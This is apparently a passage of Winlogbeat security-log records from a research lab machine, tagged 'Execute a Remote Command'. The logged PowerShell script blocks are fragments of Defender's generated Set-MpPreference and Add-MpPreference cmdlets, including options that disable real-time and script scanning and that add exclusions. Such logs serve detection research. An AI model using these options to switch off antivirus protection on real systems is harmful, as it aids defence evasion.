$__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {\n          [object]$__cmdletization_value = ${RemediationScheduleTime}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {\n          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {\n          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {\n          [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {\n          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {\n          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {\n          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {\n          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanParameters')) {\n          [object]$__cmdletization_value = ${ScanParameters}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {\n          [object]$__cmdletization_value = ${ScanScheduleDay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {\n          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}\n          $__cmdletization_methodParameter = [Microsoft.Powe"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"      $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {\n          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {\n          [object]$__cmdletization_value = ${DisableScriptScanning}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {\n          [object]$__cmdletization_value = ${DisableArchiveScanning}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {\n          [object]$__cmdletization_value = ${DisableCatchupFullScan}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {\n          [object]$__cmdletization_value = ${DisableCatchupQuickScan}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {\n          [object]$__cmdletization_value = ${DisableEmailScanning}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {\n          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {\n          [object]$__cmdletization_value = ${DisableRestorePoint}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {\n          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {\n          [object]$__cmdletization_value = ${DisableScanningNetworkFiles}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('UILockdown')) {\n          [object]$__cmdletization_value = ${UILockdown}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${UnknownThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; P"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"-Function 'Set-MpPreference' -Alias '*'\n        \n\nfunction Add-MpPreference\n{\n    [CmdletBinding(PositionalBinding=$false)]\n    \n    \n    param(\n    \n    [Parameter(ParameterSetName='Add1')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionPath},\n\n    [Parameter(ParameterSetName='Add1')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionExtension},\n\n    [Parameter(ParameterSetName='Add1')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionProcess},\n\n    [Parameter(ParameterSetName='Add1')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionIpAddress},\n\n    [Parameter(ParameterSetName='Add1')]\n    [Alias('tiddefaci')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [long[]]\n    ${ThreatIDDefaultAction_Ids},\n\n    [Parameter(ParameterSetName='Add1')]\n    [Alias('tiddefaca')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]\n    ${ThreatIDDefaultAction_Actions},\n\n    [Parameter(ParameterSetName='Add1')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${AttackSurfaceReductionOnlyExclusions},\n\n    [Parameter(ParameterSetName='Add1')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ControlledFolderAccessAllowedApplications},\n\n    [Parameter(ParameterSetName='Add1')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ControlledFolderAccessProtectedFolders},\n\n    [Parameter(ParameterSetName='Add1')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${AttackSurfaceReductionRules_Ids},\n\n    [Parameter(ParameterSetName='Add1')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]\n    ${AttackSurfaceReductionRules_Actions},\n\n    [Parameter(ParameterSetName='Add1')]\n    [switch]\n    ${Force},\n\n    [Parameter(ParameterSetName='Add1')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='Add1')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='Add1')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {\n          [object]$__cmdletization_value = ${ExclusionPath}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {\n          [object]$__cmdletization_value = ${ExclusionExtension}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {\n          [object]$__cmdletization_value = ${ExclusionProcess}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {\n          [object]$__cmdletization_value = ${ExclusionIpAddress}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          